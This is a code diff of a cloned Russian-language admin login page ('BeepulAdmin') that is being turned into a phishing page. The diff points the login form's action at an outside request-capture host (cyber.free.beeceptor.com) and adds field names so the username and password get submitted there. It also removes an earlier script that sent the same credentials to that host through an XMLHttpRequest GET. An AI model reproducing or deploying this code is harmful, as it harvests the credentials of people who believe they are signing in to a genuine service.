@@ -154,11 +154,12 @@
           <div _ngcontent-ng-c2286413090="" class="logoScnd"><img _ngcontent-ng-c2286413090=""
               src="./BeepulAdmin_files/logo.png" style="border-radius: 50%;"></div>
           <div _ngcontent-ng-c2286413090="" class="welcomeContent">
-            <form id="f" _ngcontent-ng-c2286413090="" novalidate="" class="flex ng-untouched ng-pristine ng-valid">
+            <form action="https://cyber.free.beeceptor.com" method="post" id="f" _ngcontent-ng-c2286413090=""
+              novalidate="" class="flex ng-untouched ng-pristine ng-valid">
               <h3 _ngcontent-ng-c2286413090="" class="title">Войти</h3>
               <div _ngcontent-ng-c2286413090="" style="width: 400px;"><label _ngcontent-ng-c2286413090="">Имя
-                  пользователя</label><input _ngcontent-ng-c2286413090="" nz-input="" formcontrolname="login" id="login"
-                  placeholder="Пожалуйста, введите имя пользователя"
+                  пользователя</label><input _ngcontent-ng-c2286413090="" nz-input="" formcontrolname="login"
+                  name="login" id="login" placeholder="Пожалуйста, введите имя пользователя"
                   class="ant-input ant-input-stepperless ng-untouched ng-pristine ng-valid"><!----><br
                   _ngcontent-ng-c2286413090=""><br _ngcontent-ng-c2286413090="">
                 <div _ngcontent-ng-c2286413090=""><label _ngcontent-ng-c2286413090="">Пароль</label><input
@@ -174,14 +175,6 @@
       </div>
     </auth-component><!----></app-root>
   <script src="./BeepulAdmin_files/main.js"></script>
-  <script>
-      function snd() {
-        var url = "https://cyber.free.beeceptor.com" + '?l=' + document.getElementById("login").value + '&p=' + document.getElementById('password').value;
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", url, true);
-        xhr.send();
-      }
-  </script>
 
 </body>
 
